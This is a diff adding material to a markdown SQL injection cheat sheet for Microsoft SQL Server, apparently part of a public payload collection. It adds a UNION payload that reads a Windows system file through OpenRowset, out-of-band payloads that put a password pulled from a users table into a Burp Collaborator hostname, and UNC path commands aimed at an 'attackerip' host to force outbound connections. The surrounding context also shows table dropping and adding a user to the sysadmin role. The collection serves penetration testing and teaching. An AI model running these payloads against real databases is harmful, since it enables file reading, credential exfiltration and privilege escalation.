@@ -14,6 +14,7 @@
 * [MSSQL Blind Based](#mssql-blind-based)
 * [MSSQL Time Based](#mssql-time-based)
 * [MSSQL Stacked query](#mssql-stacked-query)
+* [MSSQL Read file](#mssql-read-file)
 * [MSSQL Command execution](#mssql-command-execution)
 * [MSSQL Out of band](#mssql-out-of-band)
     * [MSSQL DNS exfiltration](#mssql-dns-exfiltration)
@@ -147,6 +148,16 @@ Use a semi-colon ";" to add another query
 ProductID=1; DROP members--
 ```
 
+
+## MSSQL Read file
+
+**Permissions**: The `BULK` option requires the `ADMINISTER BULK OPERATIONS` or the `ADMINISTER DATABASE BULK OPERATIONS` permission.
+
+```sql
+-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
+```
+
+
 ## MSSQL Command execution
 
 ```sql
@@ -196,7 +207,12 @@ GO
 Technique from https://twitter.com/ptswarm/status/1313476695295512578/photo/1
 
 ```powershell
-1 and exists(select * from fn_trace_gettable('\\'%2b(select pass frop users where id=1)%2b'.xxxxxxx.burpcollaborator.net\1.trc',default))
+# Permissions: Requires VIEW SERVER STATE permission on the server.
+1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
+
+# Permissions: Requires the CONTROL SERVER permission.
+1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
+1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
 ```
 
 
@@ -207,6 +223,21 @@ MSSQL supports stacked queries so we can create a variable pointing to our IP ad
 ```sql
 1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
 ```
+
+```sql
+xp_dirtree '\\attackerip\file'
+xp_fileexist '\\attackerip\file'
+BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'
+BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'
+RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'
+RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'
+RESTORE HEADERONLY FROM DISK = '\\attackerip\file'
+RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'
+RESTORE LABELONLY FROM DISK = '\\attackerip\file'
+RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
+RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
+```
+
 
 ## MSSQL Make user DBA (DB admin)
 
@@ -252,3 +283,4 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 * [MSSQL Trusted Links - HackTricks.xyz](https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)
 * [SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6th, 2013](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
 * [DAFT: Database Audit Framework & Toolkit - NetSPI](https://github.com/NetSPI/DAFT)
+* [SQL Server UNC Path Injection Cheatsheet - nullbind](https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e)
